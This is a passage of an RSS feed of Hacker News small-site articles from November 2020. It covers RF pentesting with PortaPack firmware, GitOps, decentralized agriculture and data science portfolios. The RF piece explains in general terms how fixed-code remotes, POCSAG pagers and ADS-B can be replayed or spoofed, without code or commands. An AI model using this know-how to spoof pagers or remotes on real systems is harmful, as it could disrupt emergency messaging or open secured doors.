also called IQ signals, IQ data or IQ samples, are often used in RF applications. They form the basis of complex RF signal modulation and demodulation, both in hardware and in software, as well as in complex signal analysis. </p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/e1e529faea7da42ebc0d3c7482281688438d438bd58d75248778ff1c9ffa95d7.png"></p><p>For simplicity, you can consider that an IQ capture is a raw capture without any type of demodulation applied and that holds enough information to later be able to analyze its content and decode. Conversely, if we encode a RF signal in IQ format, it will be very easy to send it to the air.</p><p>Black Hills Infosec has a great introduction to RF Replay attacks over their blog. <a href="https://www.blackhillsinfosec.com/how-to-replay-rf-signals-using-sdr/" target="_blank" rel="nofollow noopener">https://www.blackhillsinfosec.com/how-to-replay-rf-signals-using-sdr/</a></p><p>The best thing about the Portapack is that you do not need practically any RF knowledge or work to launch this attack, therefore it is very easy to check whether a system is vulnerable or not, before taking the time to analyzing the protocol in more depth.</p><p><strong>REMOTE CONTROLS</strong></p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/9622d19919fe2d8c3271835fea7fb2ccf707994339c8d3d0b433f910ca416ee7.jpeg"></p><p>Many of the remote-control systems we use today still use insecure protocols without any encryption or spread spectrum. Furthermore, systems based on fixed codes are still extensively used. That make basic wireless remote control rather easy to implement, but also utterly insecure. They are commonly used in inexpensive wireless devices to control garage doors, fans, toys and even some alarm systems.</p><p>Our Portapack supports sending command through various remote-control protocols. Among them the PT2262/PT2272. These ICs utilize fixed address codes and no inherent encryption so they are not high security devices.</p><p>PT2272 presents 4 bits of data and uses 8 bits address. Keep in mind that these are tri-state bits, so they can have low, float and high states. Capturing these codes from the air is incredibly easy with an SDR and software like rtl_433.  Addressing is often implemented with solder pads but, occasionally with jumpers and rarely with tri-state dip switches.  And a special note, as we have said the floating value (without any soldering) is totally valid and would work fine. Therefore in the world there are possibly thousands or tens of thousands  PT2272 devices installed by default where no code was configured so are working using the FFFFFF address.</p><p><strong>POCSAG</strong></p><p>A pager (also known as a beeper) is a wireless telecommunications device that receives and displays alphanumeric or voice messages. Pagers became widely used by the 1980s. In the 21st century, the widespread availability of cellphones and smartphones has greatly diminished the pager industry. Nevertheless, pagers continue to be used by some emergency services and public safety personnel, because pager systems reliability in some cases, including during natural and man-made disasters. This resilience has led public safety agencies to still adopt pagers over cellular and other commercial services for critical messaging.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/36d41b79f69415348d802e12e78e7ccc8d4922b4a522414a135a3823baa01405.png"></p><p>Although there are several protocols for Pagers the most common is POCSAG. This protocol dates from the 80s and although there are more modern alternatives, it has become the de facto standard in the industry. <a href="https://techcrunch.com/2019/10/30/nhs-pagers-medical-health-data/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAACZR9IHPYbq7SUYuzrM7Fs-IXdOi6U2iEmmte1ckW9sdBkKjXuwog8HTVBNTPTJd0gxyb-Xr68nClGiopHSYFVhgBXZbrgWOd0L88OyPaGncTCA77v55GXcwGY99gQHiwhq3H2t4vLRPViqJVlY9aoKlTfO89v6SBfTo8hNXaf9W" target="_blank" rel="nofollow noopener">Pagers have been under the scrutiny of information security experts for some time now as it is common for hospital pagers to spew out unencrypted patient data into the air for anyone with a radio and computer to decode</a>. Another use of POCSAG is remote control of industrial systems using text messages.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/2219729e356476cb65155b609cf5983e42489407459def3e8ec8906b6b50eab7.jpeg"></p><p>Using the portapack it is really easy to spoof POCSAG messages. We only need to know the Freq, RIC address and the speed expected by the destination pager. All of this information could be easly be sniffed using the POCSAG sniffer or with  HackRF running software like <a href="https://github.com/EliasOenal/multimon-ng" target="_blank" rel="nofollow noopener">Multimon-ng</a>. It's easy to think of the harm this capability could do in the wrong hands.</p><p><strong>ADS-B</strong></p><p>Automatic dependent surveillance–broadcast (ADS–B) is a surveillance technology in which an aircraft determines its position via satellite navigation and periodically broadcasts it, enabling it to be tracked. The information can be received by air traffic control ground stations as a replacement for older surveillance radar data, as no interrogation signal is needed from the ground.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/9ae5de693eb186657e03fb2aec34ec632092ec0fab4857edaee3a6bb9d48503e.jpeg"></p><p>ADS-B lack of any encryption or authentication within the standard. <a href="https://www.flightradar24.com/" target="_blank" rel="nofollow noopener">Flightradar24</a> a Swedish internet-based service that shows real-time aircraft flight tracking information on a map mostly from crowdsourced information gathering by volunteers with ADS-B receivers and satellite-based ADS-B …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://telescope.ac/petazzoni/mayhem-the-rf-pentesting-hackrf-portapack-firmware">https://telescope.ac/petazzoni/mayhem-the-rf-pentesting-hackrf-portapack-firmware</a></em></p>]]>
            </description>
            <link>https://telescope.ac/petazzoni/mayhem-the-rf-pentesting-hackrf-portapack-firmware</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187801</guid>
            <pubDate>Mon, 23 Nov 2020 15:35:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is GitOps such a fuss?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25187638">thread link</a>) | @savovaleks
<br/>
November 23, 2020 | https://microtica.com/gitops-devops-for-infrastructure-automation/ | <a href="https://web.archive.org/web/*/https://microtica.com/gitops-devops-for-infrastructure-automation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div>
<p><strong>GitOps</strong> offers a way to automate and manage infrastructure. It does this by using the same DevOps best practices that many teams already use, such as version control, code review, and CI/CD pipelines.</p>



<p>Companies have been adopting DevOps because of its great potential to improve productivity and software quality. Along the way, we’ve found ways to automate the software development lifecycle. But when it comes to infrastructure setup and deployments, it’s still mostly a manual process.</p>



<p>With GitOps teams can <strong>automate the infrastructure provisioning process</strong>. This is due to the ability to write your infrastructure as code (IaC) with the use of declaration files. We can store them in a Git repository, exactly as we store application development code.</p>



<h2>How does GitOps work?&nbsp;</h2>



<p>The GitOps concept was initially introduced by <a rel="noreferrer noopener" href="https://www.weave.works/" target="_blank">Weave</a><a rel="noreferrer noopener" href="https://www.weave.works/" target="_blank">w</a><a rel="noreferrer noopener" href="https://www.weave.works/" target="_blank">orks</a>, a Kubernetes management company. So discussions around GitOps are mainly in the context of Kubernetes. The transformation to microservices running in containers brought a need for orchestration platforms. Container-based applications can be complex and difficult for provisioning and management. GitOps helps in simplifying this by applying techniques proven in the DevOps world.</p>



<p>Nowadays the idea has become popular among DevOps enthusiasts, representing an <strong>upgraded model of the IaC concept</strong>. It revolves around 3 major components:</p>



<ol><li>Infrastructure as code</li><li>Pull requests</li><li>CI/CD</li></ol>



<p><em>Let’s look at them separately.</em></p>



<h3>Infrastructure as Code</h3>



<p>IaC is a practice of provisioning and managing infrastructure as <strong>declaration files,</strong> stored as code. By leveraging IaC and version control teams can optimize all operational procedures.</p>



<p>GitOps centers around the <strong>declarative model of IaC. </strong>This is why Kubernetes is a great example of implementation. Declarative means that configuration is more a declaration of an expected state, instead of a set of commands. For example, in Kubernetes, you can define the number of pods desired for a service in the manifest. The system will then take care of itself. No need for an engineer to write an imperative script that should get to the desired pod number.</p>



<p>Any cloud-native software that conforms to the declarative model can be treated as code. We use AWS CloudFormation, which is a declarative tool, to write AWS infrastructure. This means that <strong>we can treat infrastructure itself as code</strong>. Declare the desired state as code. The system applies the changes to achieve that state with automation.</p>



<p>With that said, declarative models are not a must to benefit in GitOps. You can do as well with imperatively defined environments.</p>



<h3>Pull requests</h3>



<p>The main idea behind the GitOps concept is that the version control system is a single source of truth. We use Git as a change management system for our application code. We can also use it for our infrastructure code. So the entire set of declaration files is in a single place where you can collaborate. This enables us to use the key concept of Git – the <strong>pull request</strong> for operational changes.</p>



<p>In an app development workflow, we use one main branch as a release branch. Developers create feature branches from the main branch. Develop a particular feature or story and when done create a pull request to merge it back into the main branch. This same approach is convenient for infrastructure code.</p>



<p>Creating a pull request enables the code to go through a process of code review before we integrate it into another branch of the codebase. Code reviews stop bad code from getting into test or production environments. This is even more important for infrastructure code. Having formal approvals in place via code reviews helps a lot with the auditing and troubleshooting.</p>



<h4>Git organization</h4>



<p>The deployment process in GitOps requires at least two repos: the <strong>application repo</strong> and the <strong>environment configuration repo</strong>. The first one contains the source code of the app together with its deployment manifests. The second one contains the desired state of the whole system described using a declarative specification for each environment. You can describe your environments as dev, test, production in a code repository, containing the applications and infrastructure services that can run with a particular version of that environment.</p>



<p>In the case of infrastructure, the main branch can represent an environment. We can implement the changes in the feature branch. Then create a pull request to merge the changes in the main branch. With this, we enable collaboration, while being transparent of who performed which changes. This is also beneficial for issue tracking to the root cause since all changes are commits in Git.</p>



<p>GitOps works with any Git-based system, like GitHub, BitBucket or GitLab. It is not dependent on any tool or technology.</p>



<h3>CI/CD</h3>



<p>To achieve a full GitOps implementation, you need a <strong>CI/CD pipeline</strong>. With automated delivery pipelines you can deliver infrastructure changes to designated environments, each time there is a change in the Git repository.<br>Pipelines are here to connect your Git pull requests to the orchestration system. When you trigger the pipeline with a pull request, the orchestration system executes the task.</p>



<p>There are two possibilities for a GitOps deployment strategy: <strong>Push and Pull Pipelines</strong>. The difference between them is in the way you ensure the deployment environment resembles the desired infrastructure.</p>



<h4>Push Pipelines</h4>



<p>Many popular CI/CD tools are using this strategy. We store the source code of the application and its deployment manifests in one repository. The build pipeline triggers when a new update happens in the application code. The pipeline builds the container images and pushes the changes to the environment. This strategy brings more flexibility, as it can support any type of infrastructure. The disadvantage is that it gives the CI/CD tool access to write to your environment.</p>



<figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-push-1024x548.png" alt="Push-based GitOps Deployments" srcset="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-push-1024x548.png 1024w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-push-300x160.png 300w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-push-768x411.png 768w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-push.png 1161w" sizes="100vw"><figcaption>Push-based GitOps Deployments</figcaption></figure>



<h4>Pull Pipelines</h4>



<p>The community considers the pull pipeline approach a more secure practice for GitOps. With this approach, the operator is introduced. <strong>The operator</strong> is a component between the pipeline and the orchestration tool. It constantly compares the target state in the environment repository with the actual state in the deployed infrastructure. The operator changes the infrastructure to fit the environment repository if it detects any changes. Also, it’s possible to monitor the image registry to identify new versions of images to deploy. This is what makes GitOps so special.</p>



<figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-operator-1024x558.png" alt="Pull-based GitOps Deployments" srcset="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-operator-1024x558.png 1024w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-operator-300x163.png 300w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-operator-768x418.png 768w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/11/gitops-operator.png 1353w" sizes="100vw"><figcaption>Pull-based GitOps Deployments</figcaption></figure>



<p>In GitOps the environment updates happen only when there are changes in the environment repository. The system reverts any modifications made if the implemented infrastructure changes in any manner not defined in the environment repository.</p>



<p>For most applications, you’ll probably need more than one environment. GitOps allows you to create <strong>multiple pipelines</strong> that can change the environment repository. You can use separate branches in the environment repository to manage more environments. The operator can react to the change of one branch by deploying to production and react to another branch by deploying to test.</p>



<h2>What are the benefits of GitOps?</h2>



<h3>Using DevOps best practices</h3>



<p>Since GitOps is a model focused on the pre-existing best practices of Git workflow, IaC, CI/CD pipelines, immutable servers, tracking, and observability, it represents a more advanced state of Kubernetes’ cloud-native application management. Therefore, the current stack and experience within the company can serve a lot.</p>



<h3>Continuous deployment—simplified</h3>



<p><a href="https://microtica.com/cracking-the-continuous-deployment-code/">Continuous deployment</a> means deploying faster and more often. Due to different considerations such as statefulness of systems, downtime resistance, upstream/downstream dependencies, and many other organizational relevant processes and dependencies, proper continuous deployment has been very challenging.</p>



<p>GitOps allows you to do this <strong>without having to manage a bunch of tools</strong> as everything occurs in the version control system. It provides structure and automation, thanks to the deployment operator.</p>



<p>This also increases productivity and faster MTTD (Mean-time-to-deployment). Automated continuous deployment ensures that the team can ship 30-100 times more changes every day, increasing average production performance 2-3 times.</p>



<h3>Lower MTTR (Mean-time-to-repair)</h3>



<p>MTTR is one of the <a rel="noreferrer noopener" href="https://microtica.com/13-devops-metrics-for-increased-productivity/" target="_blank">key metrics</a> DevOps teams should measure. Even small issues can be very challenging to repair in a <a href="https://microtica.com/everything-about-microservices/" target="_blank" rel="noreferrer noopener">microservice architecture</a>. As GitOps keeps all changes in the version control system and the management is automated, it is possible to reduce MTTR significantly. You have a full overview of how the environment has changed and error recovery becomes quite easy.</p>



<h3>Simplified Kubernetes management</h3>



<p>Without getting to know Kubernetes thoroughly, developers can use familiar tools such as Git to handle Kubernetes upgrades and features more easily. Newly-embedded developers will get up to speed easily and be active in days rather than months.</p>



<h3>Improved standardization across the company</h3>



<p>You have transparent end-to-end workflows through the entire enterprise because GitOps has one framework for rendering applications, software, and Kubernetes add-on modifications. Git also fully reproduces your operations activities.</p>



<h2>How to prepare for GitOps?</h2>



<ul><li><strong>Establish a stable code review and testing process.</strong> Carefully reviewing code changes can point out some obvious actions, like adding a global variable. It can prevent bad code from being released. You can then submit the validated code through pull requests, allowing no changes to be committed directly by developers. Once the pull request is reviewed and merged, you can trigger the pipeline. This is the first step in maintaining a high standard of code and subsequent stability of the system.</li></ul>



<ul><li><strong>Testing, testing, testing. </strong>Incorporating GitOps means having high-level automation that requires thorough testing of …</li></ul></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://microtica.com/gitops-devops-for-infrastructure-automation/">https://microtica.com/gitops-devops-for-infrastructure-automation/</a></em></p>]]>
            </description>
            <link>https://microtica.com/gitops-devops-for-infrastructure-automation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187638</guid>
            <pubDate>Mon, 23 Nov 2020 15:23:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Decentralizing Agriculture Production in the United States]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25187624">thread link</a>) | @kickout
<br/>
November 23, 2020 | https://thinkingagriculture.io/decentralizing-agriculture-production/ | <a href="https://web.archive.org/web/*/https://thinkingagriculture.io/decentralizing-agriculture-production/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p><em>Why do we only grow certain crops in certain areas?</em></p>



<p>One observation of agriculture production is the difference in species adaptation of various places around the world: bananas grown Central America, nuts and vegetables in California, citrus fruits in Florida, apples in Washington or New York, peanuts from the Southeast, etc. The is mostly a product of economic realities and efficiency: It is easier and cheaper to manage production (of whatever) when things are located physically near each other. This isn’t unique to agriculture, as many supply chains coalesce around centralized regions (electronic device productions, automobiles, etc.). Agriculture and food production supply chain occupy a different place on humanities priority list however, and despite applying a similar ethos to essential and luxury items, there have been few catastrophic consequences from these decisions. Agriculture and the food supply chain has mostly <em>found a way</em> over the past ~100 years. It may be time to rethink or start planning for a different strategy. One possible strategy to overcome disease and pest issues that currently reduce or harm our food production systems is to <em>decentralize</em> the areas we produce many of these crops. This would potentially alleviate several problems: 1) if a pest or pathogen infests one area, the entire crop is not lost 2) transportation costs can be reduced to the consumer resulting in 3) faster delivery from harvest to consumer (thereby increasing quality and taste).</p>



<p>To be clear, decentralization is catching on in various industries (e.g. finance technology platforms), but the concept has always been baked into agriculture without much fanfare. Residents of the United States that have travelled to Hawaii may remember <a rel="noreferrer noopener" href="https://www.aphis.usda.gov/aphis/home/" data-type="URL" data-id="https://www.aphis.usda.gov/aphis/home/" target="_blank">USDA APHIS</a> having an interest in certain plant species you may may brought along (or are trying to remove). All of that paperwork and questionnaire’s are to mitigate unintended introductions of invasive species or pathogens. One of the most economically devastating pests to harm soybean production (in the United States) is the <a rel="noreferrer noopener" href="https://www.apsnet.org/edcenter/disandpath/nematode/pdlessons/Pages/SoyCystNema.aspx" data-type="URL" data-id="https://www.apsnet.org/edcenter/disandpath/nematode/pdlessons/Pages/SoyCystNema.aspx" target="_blank">soybean cyst nematode</a>. This pathogen was not native to the United States and was <em>introduced</em> ~75 years ago. Any mitigations to prevent its spread were ineffective due to its pathogenicity and the sheer scale of soybean production in the United States. Major rows crops such as maize, soybean, wheat, and cotton reside in a different tier regarding scale of production compared to ‘specialty’ crops (namely fruits, vegetables, nuts, spices, etc.) and are not candidates for decentralizing strategies.</p>



<p>There are several high level strategies for optimizing production and profitability of the food we eat. For example, over the past ~125 years we have been optimizing maize production for the Midwest region of the United States via technological (tractors, chemical) and scientific (adapted hybrids) means. We have been successful doing this because maize was already able to be grown in Midwest thanks to the thousands of years of gradual adaptation to the United States from a plant native to Mexico (that plant being: <a rel="noreferrer noopener" href="https://blog.nationalgeographic.org/2009/03/23/corn-domesticated-from-mexican-wild-grass-8700-years-ago/" data-type="URL" data-id="https://blog.nationalgeographic.org/2009/03/23/corn-domesticated-from-mexican-wild-grass-8700-years-ago/" target="_blank">teosinte</a>). For as ubiquitous as maize is to the Midwest region of the United States, mother nature did not produce that outcome, man did. It took a long time, but humans successfully shifted the areas of adaptation of maize and indeed many other crops to what we currently see today. Tomatoes are another good example of humans bending plants to our will: Italy <a rel="noreferrer noopener" href="https://www.fas.usda.gov/data/italy-italian-processed-tomato-overview-2018#:~:text=Italy%20is%20a%20world%20leading,more%20than%20%E2%82%AC3.1%20billion.&amp;text=Italy%20is%20both%20a%20leading%20exporter%20and%20importer%20of%20tomato%20products." data-type="URL" data-id="https://www.fas.usda.gov/data/italy-italian-processed-tomato-overview-2018#:~:text=Italy%20is%20a%20world%20leading,more%20than%20%E2%82%AC3.1%20billion.&amp;text=Italy%20is%20both%20a%20leading%20exporter%20and%20importer%20of%20tomato%20products." target="_blank">produces around 50% of European and ~15% processed tomatoes</a> despite tomatoes not being introduced until the <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Age_of_Discovery" data-type="URL" data-id="https://en.wikipedia.org/wiki/Age_of_Discovery" target="_blank">Age of Discovery</a>. Bending or manipulating useful plants to grow in non-native areas is as old as farming (~10,000 BCE). Better yet, all of this adaptation was accomplished using <em>existing, </em>or native, genetic variation within their own species.</p>



<p>The theme of these examples is: ‘<em>It is possible</em>‘. With modern genomic information, we now have the tooling to do this for innumerable species. We need to start doing the same for more high value crops–namely species that are grown in geographically concentrated areas (<a rel="noreferrer noopener" href="https://www.nass.usda.gov/Charts_and_Maps/graphics/orgmap.png" data-type="URL" data-id="https://www.nass.usda.gov/Charts_and_Maps/graphics/orgmap.png" target="_blank">citrus</a>, <a rel="noreferrer noopener" href="https://ipad.fas.usda.gov/rssiws/al/crop_production_maps/us/USA_Peanut_Total_Lev2_Prod.png" data-type="URL" data-id="https://ipad.fas.usda.gov/rssiws/al/crop_production_maps/us/USA_Peanut_Total_Lev2_Prod.png" target="_blank">nuts</a>, vegetables, etc.). Modern tools (genome editing, genomic sequence data, phylogeny trees, <a rel="noreferrer noopener" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3189332/" data-type="URL" data-id="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3189332/" target="_blank">mutagenesis</a>) could allow us to make these species adapted to more diverse growing regions via photoperiod sensitivity changes, cold tolerance, heat tolerance, altitude sensitivity, flowering time and length, growth habitat, and many more traits that define ‘adaptation’ to a given geographical unit. Many scientific studies focus on utilizing natural diversity to make production greater in <em>existing</em> areas of adaptation. This makes sense (despite being short-sighted on rare occasions): growing crops is a for-profit industry so it makes sense to harness the species that are already well-adapted to the region maximize those efficiencies. But again, food production cannot be exclusively dominated by this myopic view; after all many government would deem food supply and production as a national security topic. Clearly, the United States government acts as if they believe this to some degree as well, with heavily subsidies buoying maize, soybean, cotton, and wheat production (along with several other meat and dairy industries).</p>



<p>There are other reasons to look into decentralizing production of key species though. If we had citrus that was adapted to Kansas, Colorado, Utah, Michigan, these growing regions could avoid the <a rel="noreferrer noopener" href="https://www.aphis.usda.gov/aphis/resources/pests-diseases/hungry-pests/the-threat/citrus-greening/citrus-greening-hp" data-type="URL" data-id="https://www.aphis.usda.gov/aphis/resources/pests-diseases/hungry-pests/the-threat/citrus-greening/citrus-greening-hp" target="_blank">citrus greening problems</a> of the Southeast United States by sheer physical isolation. To be clear this problem does not have an all or none solution. We need strategies to circumvent disease and pathogens <em>in</em> their current areas of production and even if production of most fruits, vegetables <em>could</em> be done in dozens of decentralized regions it adds overhead to research and development programs as they might have to tackle 5 small problems versus 1 big problem. These are known problems in centralized structures versus decentralized structures. Since food production has unique value to humans, it worth exploring whether the costs outweigh the benefits. Fruit species in particular are extremely perishable, so while the consumers values taste and quality, the producer and supplier values transportability and storage. If we remove the logistics of long distance transport via increasing production centers, scientists could focus on improving taste and quality.</p>



<p>An obvious argument against pursuing a decentralized strategy in specialty crops is the potential rise of indoor/vertical (and de-facto isolated) farms. This is an interesting proposition but I maintain the scale of production for many species of interest is simply too large to be handled in a cost effective manner in a indoor operation. Remember, outdoor grown crops have free energy in the sun and free nutrients from the soil. Indoor agriculture has to supply these somehow (and they are not free). That’s not to dismiss indoor agriculture as a supplementary component as it already is for several crops, <a rel="noreferrer noopener" href="https://www.ers.usda.gov/data-products/chart-gallery/gallery/chart-detail/?chartId=92604" data-type="URL" data-id="https://www.ers.usda.gov/data-products/chart-gallery/gallery/chart-detail/?chartId=92604" target="_blank">as about ~25% of tomatoes non-outdoor origins</a>. I continue to maintain indoor agriculture production systems can only even be sustainable for extremely high-value, low utilization specialty crops that cannot harness outdoor production systems (think spices, niche vegetables). It should be an active goal to get fruit, vegetables, and nut production decentralized in an outdoor setting that can harness soil and sunlight that are already prevalent.</p>



<p>High level movements like this are needed in agriculture to secure the food supply and add some shock absorbers to any potential pest or pathogen disruption. There is to much technology at our fingertips to not get something going. It simply appears the marker is ignoring this segment while most of the focus remains on <em>current</em> production regions.</p>



<p><em>Author can be reached at admin [at] thinkingagriculture.io</em></p>
		</div></div>]]>
            </description>
            <link>https://thinkingagriculture.io/decentralizing-agriculture-production/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187624</guid>
            <pubDate>Mon, 23 Nov 2020 15:21:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Django refactoring game – can you fix all the Models anti-patterns?]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 53 (<a href="https://news.ycombinator.com/item?id=25187507">thread link</a>) | @rikatee
<br/>
November 23, 2020 | https://django.doctor/challenge | <a href="https://web.archive.org/web/*/https://django.doctor/challenge">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://django.doctor/challenge</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187507</guid>
            <pubDate>Mon, 23 Nov 2020 15:11:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Science Portfolios on the Web]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25187391">thread link</a>) | @cl42
<br/>
November 23, 2020 | https://phaseai.com/resources/best-data-portfolios | <a href="https://web.archive.org/web/*/https://phaseai.com/resources/best-data-portfolios">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
   <div>
     <div>

     
     <p><i>By Andrea Yip on November 23, 2020</i>
     
     </p><p>A portfolio is a tool for data professionals to use to share their perspective, tell their story, and most importantly, stand out of the crowd. A strong portfolio is concise, clear, and compelling. We recently talked about tips and a checklist of what should be in your personal portfolio in a <a href="https://phaseai.com/resources/data-science-portfolio">recent Phase AI blog post</a>.

     </p><p>Many of you asked for examples of stellar portfolios, so we searched the web and found diverse portfolios that demonstrate how folks have taken different approaches to showcasing their work. 

     </p><p>Below are our favorites. We hope you take inspiration from their work!

     </p><h2>Charlie Thompson</h2>

     <p>Charlie Thompson is a Data Scientist at Spotify who has previously worked in data roles at Booz Allen Hamilton, Storyblocks and at his own consulting firm, Thompson Analytics. Charlie features some amazing personal projects and thought pieces on his website. One blog favorite is an experiment where he adds GIFs to ggplots. He pulls this off using a dancing GIF of Thom Yorke, frontman of Radiohead, and adds this to a plot of album “danceability.” A key finding? Radiohead has gotten more danceable over time.<br>&nbsp;
     
     </p><center><img src="https://phaseai.com/static/img/portfolios_post_img_thompson1.gif"><br><i>A GIF from Charlie’s blog post</i><br>&nbsp;</center>
     
     <p>Another great example is a portfolio piece called Sentify that analyzes music sentiment from your favorite artists on Spotify with R Shiny. I chose to test out Sentify with one of my favorite artists, Beyonce, and took a screenshot of the output: 

     </p><center><img src="https://phaseai.com/static/img/portfolios_post_img_thompson2.png"></center>

     <p>Looks like Queen Bey makes music that is more turbulent/angry and happy/joyful.

     </p><p>View Charlie's <a href="https://www.thompsonanalytics.com/portfolio/" target="_blank">portfolio</a> or <a href="https://www.linkedin.com/in/charlie-t-89980118b/" target="_blank">LinkedIn</a>.

     </p><h2>David Venturi</h2>

     <p>David Venturi’s career has focused on the EdTech space where he worked at Udacity and Class Central, and now leads curriculum at DataCamp. David has a great portfolio that highlights his blog posts, courses and projects he’s created at Data Camp, marketing videos, and personal projects. The site is clean, easy to navigate, and highly visual.

     </p><center><img src="https://phaseai.com/static/img/portfolios_post_img_venturi1.png"><br><i>Screenshot from David Venturi’s portfolio</i><br>&nbsp;</center>
     
     <p>David showcases his personal work which includes a project called “Fresh Tomatoes,” a site that features clickable movie trailers and demonstrates Object Oriented Programming and the power of abstraction. He provides separate links to the code and the site.
     
     </p><center><img src="https://phaseai.com/static/img/portfolios_post_img_venturi2.png"><br><i>“Fresh Tomatoes” project by David Venturi</i><br>&nbsp;</center>
     
     <p>View David's <a href="http://davidventuri.com/portfolio" target="_blank">portfolio</a> or <a href="https://www.linkedin.com/in/davidventuri/" target="_blank">LinkedIn</a>.
     
     </p><h2>Brandon Kopp</h2>
     
     <p>Brandon is a research psychologist at the Bureau of Labor Statistics where he helps design and improve surveys. He is also a retired soldier in the Army National Guard. In his portfolio, Brandon does a great job of summarizing the key points of each project (see below), followed by a more detailed explanation of his work.
     
     </p><center><img src="https://phaseai.com/static/img/portfolios_post_img_kopp1.png"><br><i>Example of a project summary</i><br>&nbsp;</center>
     
     <p>One project that stood out was a simple and fun app that he built to promote participant engagement at a Technology and Innovation fair. He used this project to give people an example of machine learning in action and demonstrate the capabilities of R and R Shiny.
     
     </p><center><img src="https://phaseai.com/static/img/portfolios_post_img_kopp2.png"><br><i>Image from Brandon’s “Rock, Paper, Scissors in R Shiny”</i><br>&nbsp;</center>
     
     <p>View Brandon's <a href="https://brandonkopp.com/data-science-portfolio/" target="_blank">portfolio</a> or <a href="https://www.linkedin.com/in/brandonmkopp/" target="_blank">LinkedIn</a>.

     </p><h2>Claudia ten Hoope</h2>

     <p>Claudia is a freelance data analyst and scientist with many years of experience in consulting and retail. Claudia’s portfolio has a consistently clear and structured approaching to showcasing her work detailing each case study by goal, result, and project duration. She then does a deep dive into each case, leveraging visuals to help her tell the story.

     </p><center><img src="https://phaseai.com/static/img/portfolios_post_img_claudia1.png"><br><i>Example of a case study from Claudia’s portfolio</i><br>&nbsp;</center>
     
     <p>In one case study, Claudia uses visuals to help her customer understand how email purchases are more likely to lead to a purchase, pushing the client to create an email strategy for sales.
     
     </p><center><img src="https://phaseai.com/static/img/portfolios_post_img_claudia2.png"><br><i>Example of a graph created for a case study</i><br>&nbsp;</center>

     <p>View Claudia's <a href="https://www.claudiatenhoope.com/#portfolio" target="_blank">portfolio</a> or <a href="https://www.linkedin.com/in/claudiatenhoope/" target="_blank">LinkedIn</a>.

     </p><h2>Want to strategize your portfolio?</h2>

     <p>We're happy to strategize your portfolio and coordinate a feedback session! Please fill out the form below and we'll get back to you soon.
     
          </p>

     </div>
   </div>
</div></div>]]>
            </description>
            <link>https://phaseai.com/resources/best-data-portfolios</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187391</guid>
            <pubDate>Mon, 23 Nov 2020 15:03:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Image Segmentation in Android with Fritz AI]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25187359">thread link</a>) | @mwitiderrick
<br/>
November 23, 2020 | https://heartbeat.fritz.ai/image-segmentation-in-android-with-fritz-ai-111b258802a3 | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/image-segmentation-in-android-with-fritz-ai-111b258802a3">archive.org</a>
